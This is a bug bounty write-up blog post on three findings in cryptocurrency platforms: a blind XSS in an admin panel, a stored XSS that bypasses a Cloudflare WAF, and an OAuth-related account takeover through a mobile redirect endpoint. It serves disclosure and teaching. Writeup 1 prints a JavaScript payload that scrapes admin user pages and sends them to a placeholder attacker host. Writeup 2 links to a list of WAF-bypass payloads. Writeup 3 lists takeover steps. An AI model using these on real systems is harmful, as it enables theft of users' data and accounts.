---
layout: post
category: writeups
---

During July, during a long session of university exams, I wanted to spend some time having fun hacking some applications and doing some ctf. I was really tired of studying for the exams and so I thought of setting myself some other goal besides the exams. Not having any specific bug bounty program in mind, I thought I'd take a look at web2 vulnerabilities in various Cryptocurrency platforms that had a bug bounty program.

Bug bounty programs related to Cryptocurrencies often have large bounties so it could be a fun and profitable target. The only problem is that the cyber security posture in these types of companies is often not well distributed. For vulnerabilities in web3 that can cause financial loss, we read about absurd bounties. On the other hand, however, vulnerabilities in web2 are often not well treated and, in some really serious cases, even large protocols really avoid them, not considering that even a web2 vulnerability could create great financial losses. A critical web vulnerability in an exchange should be as bad as a vulnerability in the protocol. A vulnerability in an admin panel that leaks sensitive data should be the same. It is really absurd to think that a decentralized system, but one that uses non-decentralized web2 infrastructures, cannot be hacked from the surface.

In this report, I analyze three vulnerabilities found during my week of bug bounty, which could have caused serious damage to some of the most popular exchange platforms and protocols. I won't name the programs for privacy reasons, some company do not want to be mentioned in any way, I will only explain the technical level reports, the impact they could have had and how the teams handled it, possibly paying an appropriate reward to the problem and resolving it quickly. After this long premise, it's time to start :)


## Writeup 1 - Blind XSS in Admin Panel at subdomain.target1.com

I had chosen a goal with really big rewards, as hacking such a program I found it really captivating and created a beautiful sense of challenge in me.

Reading the policy, it seemed they almost exclusively wanted vulnerabilities on their protocols. This must have already been a red flag. At some points in the policy, it seemed to say that if a web2 vulnerability would cause a financial loss it would be considered valid and therefore eligible for a bounty, but the policy wasn't very clear about that. There was no mention of what would be accepted and what would not, there was no mention of specific types of vulnerabilities such as RCE or SQL, nor was there a clear web scope defined.

I started by doing a quick recon phase and intercepting requests on main domains using Burp Suite. During the Recon phase I came across a particular subdomain that inspired me. Arrived at the subdomain `subdomain.target1.com` which was mainly used by administrators, I had no access to almost any page, since I didn't have an account.

Looking at the `robots.txt` file I found a promising path like this `subdomain.target1.com/panel/*`. Obviously, it was time to do some fuzzing :)

Using ffuf I managed to find a search path `subdomain.target1.com/panel/admin/search`. All the other domain paths found returned 403 or gave me redirects at the login phase and I was unable to bypass them in any way. Through this endpoint I was able to search even if I was not logged in. Unfortunately, since I was not logged in, the search never produced any results. At first glance I tried with SQL injection but without getting any results. Right away I tried Blind XSS. This time, unexpectedly, it worked. 

Thanks to blind XSS I managed to get a pingback. Analyzing the response of the page in question, I noticed that there were admin functions, and that the admin had access to a lot of user information. I started writing a script to use with Blind XSS to leak possible data and to attach to the report I was going to make. Below a possible code:


```
var a = await fetch('https://subdomain.target1.com/admin/users');
var req = await a.text();

var patt = /<a[^>]*href=["'](\/admin\/users\/[^"']*)["']/g;

while(match=patt.exec(req)){
fetch('https://'+document.domain+match[1]).then(r=>r.text()).then(r=>fetch("https://attackerurl./?data="+btoa(r)));} 
}

```

The endpoints found in the response, in simple terms, were logs to support chats used by the Company.

**What did the vulnerability allow me to do?** 
Ability to exfiltrate data such as payment methods, passwords, ID cards, transactions, and more if exploited.

Once the report was made, the company explicitly said that web2 vulnerabilities are usually out of scope, but given the serious impact they would have taken it into consideration and let me know. After a few weeks they closed the report as out of scope without even giving me a bonus bounty. 

I found the way in which the company behaved sad and wrong, given the seriousness of the vulnerability, at least a bonus of a few thousand dollars would have been correct to give. I think it is useless to put absurd bounties that reach a million dollars for a single vulnerability on protocols, if then things like this are not managed appropriately. I felt a bit scammed by the company, but it's their personal choice and how they manage their security posture, I hope they never suffer big data leaks and financial losses through web apps in the future.

## Writeup 2 - Stored XSS in subdomain.target2.com

I was testing this new company's main domains. In this case in the policy they had clearly defined the web scope as `*.target2.com`. Only one problem, the bounty ranges were really too wide in my opinion. We went from a high vulnerability of 3k dollars to a medium vuln of 200 dollars. 

In this case, once I got to a domain with a few features, I started testing them. After some digging, I was able to find one input that was vulnerable to stored XSS. The payload was wrapped in a response tag value, and the page was accessible to other users.

The only problem in this case was that almost all the domains owned by the exchange had Cloudflare to protect themselves from malicious people. Cloudflare, as many ethical hackers know, has a static analysis system that if a malicious payload entered by the user is matched, it is automatically blocked. In other words it is not possible to use simple XSS and spam classic payloads. 

You have to bypass the WAF. Since the analysis made by cloudflare is quite static, a hacker with a little experience can bypass it by doing some blackbox testing. In this case, after about ten minutes, I was able to generate 2 working payloads for two different situations, to possibly use on the site to find other vulnerable endpoints as well.

If you are a hacker and you need to find a bypass for Cloudflare, the best thing I recommend is to do a blackbox analysis of what is allowed and what is not, characters, functions, tags and events.

Reading some old payloads online can help you better understand how the WAF works and give you a little background on how to create a new payload. Of course, more often than not, payloads found online don't work because Cloudflare has added them to their WAF, so you can just use as a basis to understand how the WAF previously worked and to try to find a new bypass.

Some hackers use payloads written by others and found on the net, which, in some rare cases, can work for a short time. I recommend more understanding the basics and improving your skills than spamming a payload found online.The online payloads will not work very soon, and you may find yourself without payloads for future company penetration tests or for Bug Bounty Program, the developed skills instead you will carry them in your cultural baggage.

https://github.com/gprime31/WAF-bypass-xss-payloads/blob/master/Cloudflare%20xss%20payloads

Once I generated a working payload, I immediately reported it to the Bug Bounty program :)

In this case, the program accepted the vulnerability, but didn't pay the bounty I expected. Of the three companies, it was the one with the smallest bounties, at a maximum of $3000, the other two companies had bounties of up to a million dollars.

I thought the minimum for a stored should have been at least $1000 dollars. The company determined that the vulnerability was less critical. I also escalated it to information disclosure of sensitive data explaining to the triager why I thought it was more critical, but the triager didn't change his mind about it. 

In any case, even if I didn't agree with the criticality selected, I'm glad I helped the company and that at least a $350 bounty was given to me, in recognition of my work.

## Writeup 3 - 0 Click Account Takeover in Mobile App

With this new cryptocurrency program I was still looking for critical vulnerabilities. Being a program with a very small scope but clearly defined in the policy and with very high bounties, I aimed to analyze the main Applications and their websites, to find possible attack vectors from where to have a critical impact.

Given the really high bounties and the very small scope I thought it would be hard to find something but I didn't give up for two consecutive days.

I spent many hours in the authentication phase, trying to analyze many requests, creating various accounts and trying various techniques to get an account takeover.

Analyzing both the registration and authentication phases, my eye noticed something anomalous, which could have led me to obtain a takeover account.

In short, if you had an account registered on the platform using the OAuth2 functions, you could access using facebook, google or any third party service used during account registration. So far so normal. 

The anomalous behavior was that, if you tried to register an account with the same email manually (without OAuth2), you were able to do so and the user would receive a confirmation email for creating the account, but not you could access the profile using that email and password until your email was confirmed. 

**An odd way to set the password to an existing account created with OAuth2**, but so far unless you figure out a way to bypass the confirmation email, you don't have an account takeover.

By focusing on bypassing the confirmation email and exploiting a server misconfiguration, I finally managed to get a complete 0 click account takeover, and I could potentially use it on any account that was only registered via oauth2 to do a complete account takeover.

The account takeover was only possible via Mobile App, taking advantage of the fact that the site had Cloudflare in the way. In this case, Cloudflare helped us :)

The attack only worked thanks to the redirect endpoint found by analyzing and fuzzing the various functions of the company in those two days. This endpoint made it possible to ensure that the request, once forwarded in the browser, was transferred to the Mobile Application, which then executed the request to verify the email:

`https://target3.com/mobileRedir?email=victim%40gmail.com&token=AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&platform=mobile`


1. The attacker who wants to steal the victim's account will go to the Mobile App, and will try to register the account with the email `victim@gmail.com` and a password like `ciao1234!`.
2.The victim will receive an email to confirm the creation of the account. The victim will obviously not confirm the account
3. The attacker will go via his smartphone to the following link: `https://target3.com/mobileRedir?email=victim%40gmail.com&token=AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&platform=mobile` (PS. note that the attacker, not knowing the code received via email from the victim, will insert a random Token code into the endpoint, in this case)
4. The attacker will be presented with a target3.com page via browser where he must press a button to try to verify the account. By pressing the button, the attacker will be redirected to the application and if the Token is wrong nothing will happen.
5. The attacker returns to the browser and changes from the previous link the account Token Code with a new random Token and continues to press the generated button.
6. If the Token is wrong too many times, the code sent to the victim will no longer work. Attacker's ip in most cases will be banned by Cloudflare.
7. Now every time the attacker presses the button, he will first be redirected to the Mobile App and then back to the browser after the app crashes.
8. The attacker try to open the Mobile app normally. The first time it will crash. The attacker tries to reopen the Mobile App.
9. The app will open and the attacker will go to login and enter the credentials previously used in the registration phase, although the account has never been validated with the right Token Code.

**Now the attacker will be logged into the victim's account, despite never entering the correct verification code.**


In this case, the company triggered the vulnerability and fixed the bug in 48h and after having a little dialogue with the team to decide the criticality of the vulnerability, the team paid a good bounty. I would have preferred a few thousand dollar more, but overall I agreed with the team's decision and really appreciated the speed and attention they put into solving it.


### Some little References about this misconfiguration:

I'm not quite clear on the cause of the third vulnerability, at an implementation level, not having the Company backend source code and being a blackbox pentest, but I'm pretty sure it's something very similar to this report in case requests are resubmitted via the Mobile App (2FA Tiktok Bypass):

https://www.youtube.com/watch?v=I_1C-aev8mk

Another writeup that backend side might look like is this authorization bypass in github. In this case, the backend side checked the type of request in the if (GET, POST). Executing a HEAD did not enter the if and directly authorized the user. The difference is that in our case on the browser side everything worked perfectly, and once the ip was banned you weren't able to access the account. Instead, by registering via the Mobile App and making the requests to the Mobile App, the IP was banned but the account takeover was performed

https://blog.teddykatz.com/2019/11/05/github-oauth-bypass.html


This could be a possible code causing the account takeover (something very similar):

```
account = null;
If(login.auth == true){
      account = user.data(login.data)); 
      if(postRequest(account.verified)){ //In this case the post request was blocked by cloudflare, as the IP was banned :)
             return false;
       }
return true;
}

```

# Conclusions

I didn't spend much time doing bug bounties, as I was still in university exam session, but overall I'm very happy with the vulnerabilities found in a few days and the impact I was able to make. I really enjoyed it and it was what I wanted. It's been a very fun week, where I managed to make also some few thousand dollars.

I'm not very happy with how some teams handled the reported web2 vulnerabilities. I think companies of this caliber should care more about their security posture, not only with regard to web3 and protocols, but also with regard to the centralized web2 platforms they use. Even through simple web vulnerabilities it is possible to suffer serious data breaches and financial losses, and I believe that some companies do not give due importance to web2 vulnerabilities, when they should.

Individually, however, I really appreciated the management of the report by the latest program, the promptness in the fix and the related bounty. I congratulate their team a lot and hope I can find something else in the future in their platform.
